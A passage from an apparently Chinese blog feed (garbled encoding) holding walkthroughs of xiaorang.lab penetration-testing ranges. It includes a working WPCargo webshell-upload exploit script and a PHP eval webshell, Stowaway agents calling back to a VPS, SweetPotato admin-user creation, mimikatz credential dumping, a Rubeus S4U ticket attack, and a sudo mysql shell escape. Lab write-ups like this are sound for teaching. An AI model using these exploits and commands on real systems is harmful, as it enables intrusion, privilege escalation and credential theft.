class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-03-04 21:18:18] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:123456 å…±äº«:[print$ IPC$]</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.18        çŠ¶æ€ç :200 é•¿åº¦:57738  æ ‡é¢˜:åˆä¸€ä¸ªWordPressç«™ç‚¹</span><br><span class="line">[2025-03-04 21:18:20] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:123456 å…±äº«:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-03-04 21:18:26] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.2.16:445 admin:123456</span><br></pre></td></tr></table></figure><p>stowawayä»£ç†æ­å»º</p><p>vpsï¼š</p><p>.&#x2F;linux_x64_admin â€“heartbeat -l 61032 -s aab32</p><p>åœ¨è¢«æ§ç«¯ï¼ˆshellæœºå™¨ï¼‰å¯åŠ¨ï¼š</p><p>.&#x2F;linux_x64_agent -c &lt;VPS IPåœ°å€&gt;:61032 -s aab32</p><p>å»ºç«‹è¿æ¥åï¼Œåœ¨æœåŠ¡ç«¯é€‰ä¸­ä¸Šçº¿çš„èŠ‚ç‚¹ï¼Œå¹¶ä¸”æ‰§è¡Œsockså‘½ä»¤å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"># socks ç«¯å£ ç”¨æˆ·å å¯†ç </span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ä½¿ç”¨ <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> å°±å¯ä»¥ä»£ç†åˆ°è¢«æ§ç«¯çš„å†…ç½‘äº†ã€‚</p><p>å°è¯•ä½¿ç”¨è´¦å·å¯†ç æ—¶ä¸èƒ½ç”¨ï¼Œå»æ‰è´¦å·å¯†ç å¯ä»¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096508666-f46f4c5b-86bd-424a-bc0b-cd9899fff26f.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wpscan --url http://172.22.2.18</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096634000-4fd163b4-8589-414f-8d61-65e3c2cb8e77.png"></p><p>åœ¨ç½‘ä¸ŠæŸ¥åˆ°ç›¸å…³rceæ–‡ç« ï¼Œå¹¶ä¸”ç»™äº†åˆ©ç”¨è„šæœ¬</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="line"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br><span class="line">payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="line"></span><br><span class="line">text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = &#x27;http://172.22.2.18/&#x27;</span><br><span class="line">cmd = &#x27;ls&#x27;</span><br><span class="line"></span><br><span class="line"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="line"></span><br><span class="line">print(requests.post(</span><br><span class="line">    f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;</span><br><span class="line">).content.decode(&#x27;ascii&#x27;, &#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure><p>ä¸€æŠŠæ¢­å“ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097242152-432e24ac-96c4-427c-91ac-19c1404bed23.png"></p><p>è¿æ¥èšå‰‘</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097468462-65f4738c-3b1f-4fea-9197-0bb62f215ffd.png"></p><p>æ³¨æ„åˆ°configæ–‡ä»¶ï¼ŒæŸ¥çœ‹ï¼Œå¾—åˆ°æ•°æ®åº“ç”¨æˆ·ï¼Œå¯†ç ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097535093-d8020696-cb8e-4efb-925e-7ac856d333e1.png"></p><p>çœ‹åˆ°æ•°æ®åº“å¯†ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097611345-626c0295-5559-4f33-a7a4-7ea3a73c8fae.png"></p><p>è¿ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097825364-0c40cb50-178a-4601-b5c9-957d0ffd7379.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097848512-32f63a9b-b19f-4fa1-a61e-e642a10b52ff.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097893511-d550b24f-bebb-405f-8861-ca75914eb4cb.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097949837-bd1dc40d-912a-49a6-beb0-1c8dbec6fb9a.png"></p><h2 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h2><p>å‘ç°äº†ä¸€ä¸ªå¯†ç è¡¨ï¼Œå¯¼å‡º</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741098031228-51623acd-b968-4fdb-8a75-c28e064032b1.png"></p><p>å†å›åˆ°ä¹‹å‰çš„fscanæ‰«æç»“æœï¼Œè¿˜æœ‰1433ç«¯å£å¼€æ”¾å»çˆ†ç ´ï¼Œç”¨é‚£ä¸ªå¯†ç çˆ†ç ´172.22.2.16:1433ã€‚</p><p>fscan -h 172.22.2.16 -m mssql -pwdf 1.txt [+] mssql:172.22.2.16:1433:sa ElGNkOiC</p><p>è¿™é‡Œç¯å¢ƒå‡ºäº†ç‚¹é—®é¢˜ä½¿ç”¨pwncat,æ”¶åˆ°shellä¹‹åä¼šè¿›å…¥åˆ°pwncatç»ˆç«¯æ¨¡å¼è¿™æ—¶å€™æƒ³è¦å›åˆ°shellæ¨¡å¼åªéœ€è¾“å…¥back</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099289493-89c305d8-7d31-407a-9897-46ccdaba099c.png"></p><p>ä¸Šmdut</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099687174-ae3aa826-ea72-41f6-b05e-3f0117b68a75.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099672431-f77c0d4c-4dcc-4fe0-bb9a-bc1b7e8c8cb9.png"></p><p>Sweetpotatoææƒ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173053940-52a8cf16-e934-49b0-9071-498948ab5472.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;net user test qwer1234! /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;net localgroup administrators test /add&quot;</span><br></pre></td></tr></table></figure><p>rdpä¸Šå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173674191-1d0d56f3-d525-42b3-b4dd-993d7bea54bf.png"></p><p>åœ¨ç”¨æˆ·ä½ç½®ç¿»åˆ°flag<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173741629-bc01e5f5-32a8-4973-810c-8d982b9d2bc3.png"></p><h2 id="åŸŸæ¸—é€"><a href="#åŸŸæ¸—é€" class="headerlink" title="åŸŸæ¸—é€"></a>åŸŸæ¸—é€</h2><p>å‘ç°åœ¨åŸŸå†…ï¼Œä¸Šä¼ çŒ•çŒ´æ¡ƒæŠ“å–hashï¼Œç®¡ç†å‘˜è¿è¡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173940219-360b1c9b-55da-48b7-b6ee-790d66abcb6b.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741174493844-66ff867c-1d95-4e26-8e0b-d25c5328698b.png"></p><p>è¿™é‡Œç”¨Adinfoï¼ˆ<a href="https://github.com/lzzbb/Adinfo/releases">https://github.com/lzzbb/Adinfo/releases</a>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Adinfo_win.exe -d xiaorang.lab --dc 172.22.2.3 -u MSSQLSERVER$ -H 26c5767767ddac88dfccd8449fc11502</span><br></pre></td></tr></table></figure><p>å‘ç°çº¦æŸå§”æ´¾</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741175206994-aca6b607-39e0-49f8-a5dd-8bfaae57ae49.png">MSSQLSERVER é…ç½®äº†åˆ°åŸŸæ§çš„çº¦æŸå§”æ´¾, å¯ä»¥é€šè¿‡ S4U ä¼ªé€ é«˜æƒé™ ST æ‹¿ä¸‹åŸŸæ§ï¼Œç”¨Rubeusç”³è¯·è®¿é—®è‡ªèº«çš„æœåŠ¡ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:26c5767767ddac88dfccd8449fc11502 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176177798-4ad88854-8e4f-43eb-b2f3-89b27c855ed1.png"></p><p>ä¹‹åæ³¨å…¥ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE35FWG/jPPvxUw/lHeSjZgWtlqb2wYxA+JK8guQVinSocTPiJxmyzJx4QmWVBa2kXo0gizhWCEYNjrSdWhMJ5I8vzw+e8Bft3i5m5svPbcyImYWhDlg7Mvysh0fAekboYFgUWklHkA0OvwPyd9pA8K9e9mNzq2SyxHmkNxWtmX0tgPAZXnowM3DKT9Uewdl0zfHeqCfRqGErml+IxkQmgyllrnxluhlDcU+yjETECmnUX2AUGd9DivoCw2Nk6iTRlc09pCYtU2gVjrte4knoZRw8cmpn5bPnYzXkMBdedYngf0ihW0xo+kKh6XzWuTC1Q4EtTWHQmr/oWzuNfmh0ldOJVx0BarDogz8NCmYIo81zGp9XUYjeajFOC3qRsLGsMwQg0m0CdoX24dRS5haMtTbNVsXt+y1Fk2Q0bykJPN1/U2vol0i2jVGPXJcDsrz5JmFOAWswAQ1pjz/FoPh6/be/0MY2p5tJwmXc7BTSeDLvJAcK5YnbeQZ9KNlLIEB3oECXjdkIq992blr6Nn0+ReEHWQkCreUPjHgTLu69qURQrzOruUZlrV+LusdGptZVg/HCP74aKleqTBp35sT/zyCL+GgqkFq0FLelQxebb8lbbreysa1GG8IivGROl2bqb4w9AqDuoCQTXa87F22nQ24d9ZL1U5STQWKL5d5T0TivwXyRqGNHcveSJfYN17fiwTVhxb5og/F17BLClvid+zDmXe4iZ6oyXgefSXAv35WekdhrywWm3DED3qd7V5WBo1Zd5JRojuZbg0+thmC/gCJcQtoU8xpiIqP/2fKA2NlKQYf5BjhXlbOri/Yq+TRRZVQQUgQS58dYfi9hLNgE5nzlnfmCY49uXCe3WbzoNFVPconnjRJUh9PP+QOk+0l2mLsUKeaQaFldlB8PbAh7nhPPJVycjOACBMNDFUr90VF9WgHnijxvFDkp3XHktauL4EaInkxPg7QSsk0pVCowVrdRRwkPyPVW38/3MwA5/j7Jg7yeice+gV3UcrvRbRChb1fJZcyHcC4BSo9U+iKJtBs1Zcm3DqTQVas4f9qc9eKtQJze+icr+lbMsQwJYk9ZUSOTBueg8eVWGnSwMACaMAjUjkUYYyh36oZMRPb24zr4weUIxGsixxUbLdtnszq8givNuxCXX2ES53L72XxkKuGULblnqL0Yf5O7Hwr2fIkbwRJjnweAd7c/IcT/4uyhnp8VhabIgv9N5UdlTgfCyGyfZVxEhxxPd88ma/QNXsiicnHX/QQ0g8AYLA3175X/n/pBNZZkALWo7PoSc/BB+Xbq3gSrDgMpxaywGu9Gnz/Q1vyk9txVO6WN7x7ivu+3s/z17CwRkjF0LNzoZ4/+JUwQSXesdKTcCdLC0fNodwl0HF2Dkv4nCwvaPh+Xac0i/TpXMQJho6dyphE19l6hXJTTaLolWYQEgkIKgDQlFuCdTKXPkygJxv/G5ED3dGjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBBlCcnhKBNudgBbGrCE1V9ZoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMwNTEyMDIyMVqmERgPMjAyNTAzMDUyMjAyMjFapxEYDzIwMjUwMzEyMTIwMjIxWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure><p>ä¹‹åå†è®¿é—®åŸŸæ§é‡Œé¢çš„flagæ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176338122-b4118e59-c198-46e9-8e3b-0f562523f580.png"></p><p>å‚è€ƒï¼š<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Initial</title>
      <link href="/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"/>
      <url>/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/</url>
      
        <content type="html"><![CDATA[<h2 id="tpæ¼æ´rce"><a href="#tpæ¼æ´rce" class="headerlink" title="tpæ¼æ´rce"></a>tpæ¼æ´rce</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234482347-cdd9bc09-4cd0-4df2-bc3f-2311a57be31e.png"></p><p>ä¸Šèšå‰‘</p><p>find &#x2F; -user root -perm -4000 -print 2&gt; result.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234587677-742f1d77-c0b4-42e9-9ba8-1f01915eba7d.png"></p><p>suidææƒæ²¡æœ‰ï¼Œå°è¯•sudo</p><p>å‘ç°mysqlå‘½ä»¤</p><p>ææƒå‘½ä»¤</p><p><a href="https://www.huangmj.com/17116743651246.html#36-sudo-mysql">https://www.huangmj.com/17116743651246.html#36-sudo-mysql</a></p><p>æŸ¥çœ‹æ–‡ä»¶åå¸¦flagçš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234708830-8a13ee63-03ba-4500-a518-1abc1f94953a.png"></p><p>è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure><p>æç¤ºä¸‹ä¸€ä¸ªåœ¨å†…ç½‘ä¸­ï¼Œ</p><p>vpsèµ·ä¸ªæœåŠ¡ï¼Œwgetä¸‹ä¸ªfscanæ‰«ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235072247-9d0b560e-1bcb-45ae-9c8f-e81d4a13fd38.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235032844-2b3ef0e7-afc6-4712-b280-9f9f1ade5c55.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235174837-6446d7ac-8daf-414f-b707-c11c420284c6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[2025-03-06 12:25:54] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1</span><br><span class="line">[2025-03-06 12:25:54] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ</span><br><span class="line">[2025-03-06 12:25:54] [INFO] CIDRèŒƒå›´: 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-03-06 12:25:54] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-06 12:25:54] [INFO] è§£æCIDR 172.22.1.15/24 -&gt; IPèŒƒå›´ 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-03-06 12:25:54] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256</span><br><span class="line">[2025-03-06 12:25:54] [INFO] å¼€å§‹ä¸»æœºæ‰«æ</span><br><span class="line">[2025-03-06 12:25:54] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...</span><br><span class="line">[2025-03-06 12:25:54] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…</span><br><span class="line">[2025-03-06 12:25:54] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] ç›®æ ‡ 172.22.1.15     å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] ç›®æ ‡ 172.22.1.18     å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] ç›®æ ‡ 172.22.1.2      å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] ç›®æ ‡ 172.22.1.21     å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-06 12:26:00] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4</span><br><span class="line">[2025-03-06 12:26:00] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:88</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:80</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.15:80</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.15:22</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:389</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:3306</span><br><span class="line">[2025-03-06 12:26:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.15:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-03-06 12:26:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:3306 =&gt; [mysql] äº§å“:MySQL ä¿¡æ¯:unauthorized Banner:[D.j Host &#x27;172.22.1.15&#x27; is not allowed to connect to this MySQL server]</span><br><span class="line">[2025-03-06 12:26:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:88 =&gt; </span><br><span class="line">[2025-03-06 12:26:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:80 =&gt; [http]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:389 =&gt; [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.15:80 =&gt; [http]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:139 =&gt;  Banner:[.]</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°1.18çš„80ç«¯å£å¼€æ”¾ï¼Œæ­ä¸ªsocksä»£ç†</p><p>stowawayä»£ç†æ­å»º<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236043329-96883d9a-829b-4821-bc7a-e026e62572fe.png"></p><p>vpsï¼š</p><p>.&#x2F;linux_x64_admin â€“heartbeat -l 61032 -s aab32</p><p>åœ¨è¢«æ§ç«¯ï¼ˆshellæœºå™¨ï¼‰å¯åŠ¨ï¼š</p><p>.&#x2F;linux_x64_agent -c &lt;VPS IPåœ°å€&gt;:61032 -s aab32</p><p>å»ºç«‹è¿æ¥åï¼Œåœ¨æœåŠ¡ç«¯é€‰ä¸­ä¸Šçº¿çš„èŠ‚ç‚¹ï¼Œå¹¶ä¸”æ‰§è¡Œsockså‘½ä»¤å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"># socks ç«¯å£ ç”¨æˆ·å å¯†ç </span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ä½¿ç”¨ <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> å°±å¯ä»¥ä»£ç†åˆ°è¢«æ§ç«¯çš„å†…ç½‘äº†ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235555816-d9470307-455e-44bf-9cd7-85863d8e6ff5.png"></p><p>kalié…ç½®å¥½socksä»£ç†åï¼Œåˆ›å»ºpocç›®å½•ï¼Œè„šæœ¬åŒç›®å½•æ”¾ä¸€ä¸ª1.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>poc.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 